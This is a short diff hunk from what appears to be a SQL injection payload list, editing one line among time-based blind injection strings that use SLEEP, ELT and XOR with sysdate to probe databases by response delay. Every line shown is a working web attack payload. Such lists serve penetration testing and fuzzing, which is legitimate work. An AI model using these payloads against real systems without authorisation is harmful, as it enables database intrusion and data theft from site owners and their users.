@@ -339,7 +339,7 @@ RLIKE SLEEP(20)--
 ') AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(20))-- 1337
 ") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(20))-- 1337
 SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
-"XOR(if(now()=sysdate(),sleep(9),0))XOR"Z
+0"XOR(if(now()=sysdate(),sleep(9),0))XOR"Z
 'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
 'XOR(if(now()=sysdate(),sleep(20*1),0))XOR'Z
 'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z
